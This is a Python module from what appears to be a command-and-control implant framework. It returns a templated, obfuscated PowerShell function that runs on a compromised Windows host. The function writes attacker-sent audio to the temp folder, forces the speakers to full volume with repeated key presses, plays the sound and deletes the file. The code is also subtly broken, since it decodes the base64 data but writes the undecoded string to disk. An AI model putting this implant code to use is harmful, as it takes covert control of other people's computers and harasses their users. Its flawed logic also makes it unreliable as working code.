class PlayAudio:
    type = "PS"
    args = "sound file location (on Fudge)"
    input = "play_audio"

    def process_implant_response(self):
        print("We're processing play audio response")

    def implant_text(self):
        var = '''
function {{ ron.obf_remote_play_audio }}($data){
# need to checkf for $datas existance
    $data.length
    if ($data.length -lt 4){
            $Script:tr = "1"
        }
    $file = "dev_temp_name"
    $t = "$env:TMP/$file.mp3"
    # $t = "C:\\Users\Kris/$file.mp3"

    $b = $data.substring(2)
    $lkj = [System.Convert]::FromBase64String($b)
    $data | Set-Content "$t" -Encoding Byte

    Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}}
    Set-Speaker -Volume 50

    Add-Type -AssemblyName presentationCore
    $mediaPlayer = New-Object system.windows.media.mediaplayer
    $mediaPlayer.Volume = 1
    $mediaPlayer.Open("$t")
    $duration = 2
    $duration = $duration + $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
    Write-Output $duration
    $mediaPlayer.Play()
    #$duration = $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
    sleep($duration)
    $mediaPlayer.Close()
    Remove-Item -Confirm:$false "$t" 
    return
}


'''
        return var
